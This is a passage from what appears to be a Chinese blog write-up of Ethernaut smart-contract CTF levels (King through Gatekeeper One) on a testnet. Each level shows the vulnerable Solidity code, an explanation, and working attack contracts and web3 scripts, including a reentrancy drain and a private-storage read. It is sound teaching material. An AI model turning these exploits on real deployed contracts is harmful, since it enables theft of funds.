<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">contract Hacker &#123;</span><br><span class="line">    address payable target;</span><br><span class="line"></span><br><span class="line">    constructor(address payable _target) &#123;</span><br><span class="line">        target = _target;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        require(msg.sender != target);</span><br><span class="line">        (bool success,) = target.call&#123;value: 0.0001 ether&#125;(&quot;&quot;);</span><br><span class="line">        require(success, &quot;Something went wrong&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这里需要注意转账的方式：transfer() 和 send() 有2300的 gas 限制，所以要使用 call()。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202310200456079.png"
                      alt="image-20231020045629006"
                ></p>
<h2 id="10-Re-entrancy"><a href="#10-Re-entrancy" class="headerlink" title="10 Re-entrancy"></a>10 Re-entrancy</h2><p>代码如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.12;</span><br><span class="line"></span><br><span class="line">import &#x27;openzeppelin-contracts-06/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract Reentrance &#123;</span><br><span class="line">  </span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  mapping(address =&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">  function donate(address _to) public payable &#123;</span><br><span class="line">    balances[_to] = balances[_to].add(msg.value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _who) public view returns (uint balance) &#123;</span><br><span class="line">    return balances[_who];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function withdraw(uint _amount) public &#123;</span><br><span class="line">    if(balances[msg.sender] &gt;= _amount) &#123;</span><br><span class="line">      (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);</span><br><span class="line">      if(result) &#123;</span><br><span class="line">        _amount;</span><br><span class="line">      &#125;</span><br><span class="line">      balances[msg.sender] -= _amount;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>目标是掏空合约余额。</p>
<p>标题为重入攻击，原理为：</p>
<p>用一句话来概括就是，攻击者会编写攻击智能合约，调用受害合约，利用自己的 Fallback 函数，循环调用一段受害者合约的代码。由于是因为重复进入受害者合约执行一段代码导致的漏洞，就叫做重入攻击。</p>
<p>本题在 withdraw 函数中采用了先转账后扣取余额的顺序，可以利用攻击合约的回调函数进行重入。</p>
<p>攻击合约：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">contract Hacker &#123;</span><br><span class="line">    Reentrance public myReentrance;</span><br><span class="line"></span><br><span class="line">    constructor(address payable _target) public &#123;</span><br><span class="line">        myReentrance = Reentrance(_target);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public payable &#123;</span><br><span class="line">        myReentrance.donate&#123;value: msg.value&#125;(address(this));</span><br><span class="line">        myReentrance.withdraw(myReentrance.balanceOf(address(this)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        if (address(myReentrance).balance &gt;= 0.001 ether) &#123;</span><br><span class="line">            myReentrance.withdraw(0.001 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>调用 attack() 时 msg.value 必须大于等于 0.001ETH。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202310230142626.png"
                      alt="image-20231023014236563"
                ></p>
<h2 id="11-Elevator"><a href="#11-Elevator" class="headerlink" title="11 Elevator"></a>11 Elevator</h2><p>代码如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Building &#123;</span><br><span class="line">    function isLastFloor(uint) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Elevator &#123;</span><br><span class="line">    bool public top;</span><br><span class="line">    uint public floor;</span><br><span class="line"></span><br><span class="line">    function goTo(uint _floor) public &#123;</span><br><span class="line">        Building building = Building(msg.sender);</span><br><span class="line"></span><br><span class="line">        if (!building.isLastFloor(_floor)) &#123;</span><br><span class="line">            floor = _floor;</span><br><span class="line">            top = building.isLastFloor(floor);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>This elevator won’t let you reach the top of your building. Right?</p>
<p>这部电梯不会让你到达楼顶。对吧？</p>
<p>题目意思应该是要使 top 为 true。</p>
<p>题目中把 msg.sender 强制转换为 Building 接口的类型，即 msg.sender 必须是一个实现了 Building 接口的合约，至于使 top 为 true，写个函数骗过去就行了。</p>
<p>攻击合约：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">contract Hacker is Building &#123;</span><br><span class="line">    Elevator public myelevator;</span><br><span class="line">    uint public n = 0;</span><br><span class="line"></span><br><span class="line">    constructor(address _target) public &#123;</span><br><span class="line">        myelevator = Elevator(_target);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        myelevator.goTo(114514);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isLastFloor(uint) external returns (bool) &#123;</span><br><span class="line">        if (n == 0) &#123;</span><br><span class="line">            n++;</span><br><span class="line">            return false;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            n = 0;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202310230249848.png"
                      alt="image-20231023024949802"
                ></p>
<h2 id="12-Privacy"><a href="#12-Privacy" class="headerlink" title="12 Privacy"></a>12 Privacy</h2><p>代码如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Privacy &#123;</span><br><span class="line">    bool public locked = true;</span><br><span class="line">    uint256 public ID = block.timestamp;</span><br><span class="line">    uint8 private flattening = 10;</span><br><span class="line">    uint8 private denomination = 255;</span><br><span class="line">    uint16 private awkwardness = uint16(block.timestamp);</span><br><span class="line">    bytes32[3] private data;</span><br><span class="line"></span><br><span class="line">    constructor(bytes32[3] memory _data) &#123;</span><br><span class="line">        data = _data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function unlock(bytes16 _key) public &#123;</span><br><span class="line">        require(_key == bytes16(data[2]));</span><br><span class="line">        locked = false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">    A bunch of super advanced solidity algorithms...</span><br><span class="line"></span><br><span class="line">      ,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`</span><br><span class="line">      .,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,</span><br><span class="line">      *.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^         ,---/V\</span><br><span class="line">      `*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.    ~|__(o.o)</span><br><span class="line">      ^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;  UU  UU</span><br><span class="line">  */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>看上去就是要把这些 private 的变量读取，然后调用 unlock() 使 locked 为 false，想到读 slot。</p>
<table>
<thead>
<tr>
<th>数据类型</th>
<th>大小</th>
<th>插槽</th>
</tr>
</thead>
<tbody><tr>
<td>bool</td>
<td>1 Byte</td>
<td>Slot 0</td>
</tr>
<tr>
<td>uint256</td>
<td>32 Bytes</td>
<td>Slot 1</td>
</tr>
<tr>
<td>uint8</td>
<td>1 Byte</td>
<td>Slot 2</td>
</tr>
<tr>
<td>uint8</td>
<td>1 Byte</td>
<td>Slot 2</td>
</tr>
<tr>
<td>uint16</td>
<td>2 Bytes</td>
<td>Slot 2</td>
</tr>
<tr>
<td>bytes32[3]</td>
<td>96 Bytes</td>
<td>Slot 3, 4, 5</td>
</tr>
</tbody></table>
<p>经过对各个变量所用存储空间的计算，data[2] 存储于 slot5，上 python 脚本读吧。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"></span><br><span class="line">w3 = Web3(Web3.HTTPProvider(<span class="string">&#x27;https://rpc.sepolia.org&#x27;</span>))</span><br><span class="line"><span class="comment"># print(w3.is_connected())</span></span><br><span class="line"><span class="built_in">print</span>(w3.eth.get_storage_at(<span class="string">&#x27;0xDFA42F31cea9d624a9E794D809894D39b4F1fcA9&#x27;</span>, <span class="number">5</span>).<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure></div>

<p>输出：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@fatbee-laptop:/mnt/c/Users/13246/web3<span class="comment"># python py/hack_12.py</span></span><br><span class="line">0x6b6077ff2045271ed9c281d35cb5762eebd69455f990d6d1677c384638a0c72b</span><br></pre></td></tr></table></figure></div>

<p>在使用 bytes16() 对 bytes32 进行强制类型转换的时候，64 位十六进制数会只剩下前面的 32 位，使用其作为 unlock() 的参数进行调用即可。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202310241010622.png"
                      alt="image-20231024101040557"
                ></p>
<h2 id="13-Gatekeeper-One"><a href="#13-Gatekeeper-One" class="headerlink" title="13 Gatekeeper One"></a>13 Gatekeeper One</h2><h3 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract GatekeeperOne &#123;</span><br><span class="line"></span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    require(msg.sender != tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    require(gasleft() % 8191 == 0);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;);</span><br><span class="line">      require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;);</span><br><span class="line">      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), &quot;GatekeeperOne: invalid gateThree part three&quot;);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">    entrant = tx.origin;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>Make it past the gatekeeper and register as an entrant to pass this level.</p>
<p><strong>Things that might help:</strong></p>
<ul>
<li>Remember what you’ve learned from the Telephone and Token levels.</li>
<li>You can learn more about the special function <code>gasleft()</code>, in Solidity’s documentation (see <a class="link"   target="_blank" rel="noopener" href="https://docs.soliditylang.org/en/v0.8.3/units-and-global-variables.html" >here <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> and <a class="link"   target="_blank" rel="noopener" href="https://docs.soliditylang.org/en/v0.8.3/control-structures.html#external-function-calls" >here <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>).</li>
</ul>
<h3 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h3><p>合约里面有三个函数修改器，满足这三个修改器里面的断言才能成功执行 enter 函数，那么沿着这些条件倒推就能找出 _gateKey 的值了。</p>
<p>关于 <a class="link"   target="_blank" rel="noopener" href="https://docs.soliditylang.org/en/latest/types.html#conversions-between-elementary-types" >Solidity 类型转换 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
<p><strong>gateThree_3</strong>：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), &quot;GG&quot;);</span><br></pre></td></tr></table></figure></div>

<p>这里已知的部分是等号右边，tx.origin 即自己的地址，地址 address 类型是大小20字节的十六进制数，而 uint160 所占空间 160bits，即20字节，所以第一层类型转换不会出现信息丢失。</p>
<p>第二层类型转换是由 uint160 到 uint16，由大到小的类型转换必然会造成信息丢失，转换的具体情况：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">uint160(tx.origin): 0x42285Fb92421db39XXXXXXXXXX5f4B092bb0e411</span><br><span class="line">              (DEC: 377693759349744031XXXXXXXXXX57517436574663500817)</span><br><span class="line">uint16: 0xe411</span><br><span class="line">  (DEC: 58385)</span><br></pre></td></tr></table></figure></div>

<p>其实就是按照目标类型的大小，从右侧开始保留相应的数据，如上面保留2字节的数据。</p>
<p>以上的类型转换都是显式转换。等号的右边的数据类型是 uint16，左边是 uint32，那么两边在使用运算符计算的时候会进行隐式转换，且不造成信息丢失。</p>
<p>这里就是把 uint16 转换为 uint32，具体是在左侧补零，值保持不变。但是第一层是由 bytes8 转换至 uint64，看看如何转换。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">uint32(uint64(_gateKey)): 0x0000e411</span><br><span class="line">                    (DEC: 58385)</span><br><span class="line">uint64(_gateKey): 0x********0000e411</span><br><span class="line">            (DEC: Not sure)</span><br><span class="line">_gateKey: 0x********0000e411</span><br></pre></td></tr></table></figure></div>

<p>bytesN 类型只能转换为大小相同的 uint 类型，如上面的 bytes8 &#x3D;&gt; uint64，转换后无信息丢失。上面数据的星号可以用任意十六进制数代替。</p>
<p><strong>gateThree_2</strong>：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GG&quot;);</span><br></pre></td></tr></table></figure></div>

<p>这里比较好理解，由 uint64 到 uint32 的类型转换造成的信息丢失，又被 uint32 到 uint64 的隐式转换填充上了0，所以只需要往 _gateKey 的前半部分（星号部分）添加非0的数据即可。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_gateKey: 0x123456780000e411</span><br></pre></td></tr></table></figure></div>

<p>这样就能通过 gateThree 的第二部分。</p>
<p><strong>gateThree_1</strong>：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GG&quot;);</span><br></pre></td></tr></table></figure></div>

<p>这里左半边结果是<code>0x0000e411</code>，右半边是<code>0xe411</code>，所以只要不对相差的那四个0做改变就好，因为右半边进行隐式转换后也会变成<code>0x0000e411</code>。</p>
<p><strong>gateTwo</strong>：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">require(gasleft() % 8191 == 0);</span><br></pre></td></tr></table></figure></div>

<p>这里要求剩余的 gas 必须是8191的整数倍，且不能为0，因为 Solidity 对0取模会报出 Panic 错误。</p>
<p>这里需要看实际消耗的 gas，所以要利用以太坊浏览器上链调试，写个初步的攻击合约看看：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">contract Hack &#123;</span><br><span class="line">    GatekeeperOne public myGate;</span><br><span class="line"></span><br><span class="line">    constructor(address _target) public &#123;</span><br><span class="line">        myGate = GatekeeperOne(_target);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        myGate.enter(0x123456780000e411);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>查看操作码：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202311291626269.png"
                      alt="image-20231129162654806"
                ></p>
<p>看到整个过程中有两个 REVERT，其中第一个是目标合约 gateTwo 中触发的，顺着往上找到了 GAS。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202311291631672.png"
                      alt="image-20231129163152030"
                ></p>
<p>对 GAS 的解释是：在这条指令执行之后剩余的 gas，所以这里的 GAS 就是 gateTwo 中的 gasleft()，调一下 gas 就行。</p>
<p>这里把 GAS LIMIT 设置成819100，继续查看：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202311291637508.png"
                      alt="image-20231129163727465"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202311291638236.png"
                      alt="image-20231129163801201"
                ></p>
<p>结果是780160，819100-780160&#x3D;38940，即为运行到 gasleft() 处花费的 gas。所以我们提供819100+38940&#x3D;858040的 gas 即可通过 gateTwo</p>
<p>。。。吗？</p>
<p>首先上文我犯了个错误，gasleft() 返回值为执行完 GAS 后的剩余 gas 值，所以我们参考的值应该为：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202311291651820.png"
                      alt="image-20231129165123779"
                ></p>
<p>其次，即使我们参考正确的 gas 值进行计算得出理论上正确的 gas limit（858042），也无济于事</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\13246\AppData\Roaming\Typora\typora-user-images\image-20231129165531255.png"
                      alt="image-20231129165531255"
                ></p>
<p>看这个小玩意，问题出在这里，使用 Txn Type 2 会导致 gas 费用是动态的，简单来说是会给到矿工合适的小费，这个“合适”并不固定，所以一直算不准。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202311292140786.png"
                      alt="image-20231129214045743"
                ></p>
<p>关于 <a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/feeltouch/article/details/124975358" >EIP-1559 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
<p>由于 Txn Type 0 的交易并不会定义 maxFee 和 maxPriority，即提供多少 gas 是固定的，那么发送这种类型的交易即可。</p>
<p>。。。吗？</p>
<p>猜测：实际上由于 gasPrice 的变化，即使使用 Type 0 也无济于事，只能减少它的浮动范围罢了。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202311300207236.png"
                     
                ></p>
<p>结果：把 gas 固定在100000进行测试，每次都一样，从调用直到 GAS 操作码执行完毕消耗27706，把 gas 增加至819100，测试下，到 GAS 之后稳定消耗38942。实在是找不出导致这种现象的原因，一步一步调着先吧，最终调试出 gas 为858660时可以稳定成功。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202311300312620.png"
                      alt="image-20231130031208573" style="zoom:150%;" 
                >

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202311300312156.png"
                      alt="image-20231130031249102"
                ></p>
<p>这里连续执行了5次，都是成功的。</p>
<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>攻击合约：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">contract Hack &#123;</span><br><span class="line">    GatekeeperOne public myGate;</span><br><span class="line"></span><br><span class="line">    constructor(address _target) public &#123;</span><br><span class="line">        myGate = GatekeeperOne(_target);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        myGate.enter(0x123456780000e411);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>用于调用攻击合约方法的 python 脚本：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"></span><br><span class="line">web3 = Web3(Web3.HTTPProvider(<span class="string">&#x27;https://rpc.sepolia.org&#x27;</span>))</span><br><span class="line"></span><br><span class="line">sender_address = <span class="string">&#x27;SENDER_ADDRESS&#x27;</span></span><br><span class="line">recipient_address = <span class="string">&#x27;RECIPIENT_ADDRESS&#x27;</span></span><br><span class="line"></span><br><span class="line">private_key = <span class="string">&#x27;YOUR_PRIVATE_KEY&#x27;</span></span><br><span class="line"></span><br><span class="line">transaction_params = &#123;</span><br><span class="line">    <span class="string">&#x27;from&#x27;</span>: sender_address,</span><br><span class="line">    <span class="string">&#x27;to&#x27;</span>: recipient_address,</span><br><span class="line">    <span class="string">&#x27;value&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&#x27;data&#x27;</span>: <span class="number">0x9e5faafc</span>,</span><br><span class="line">    <span class="string">&#x27;nonce&#x27;</span>: web3.eth.get_transaction_count(sender_address),</span><br><span class="line">    <span class="string">&#x27;gas&#x27;</span>: <span class="number">858660</span>,</span><br><span class="line">    <span class="string">&#x27;gasPrice&#x27;</span>: web3.eth.gas_price,</span><br><span class="line">    <span class="string">&#x27;chainId&#x27;</span>: <span class="number">11155111</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">transaction = web3.eth.account.sign_transaction(transaction_params, private_key)</span><br><span class="line">transaction_hash = web3.eth.send_raw_transaction(transaction.rawTransaction)</span><br><span class="line">transaction_receipt = web3.eth.wait_for_transaction_receipt(transaction_hash)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> transaction_receipt.status:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Transaction successful!&#x27;</span>)</span><br><span class="line"><span 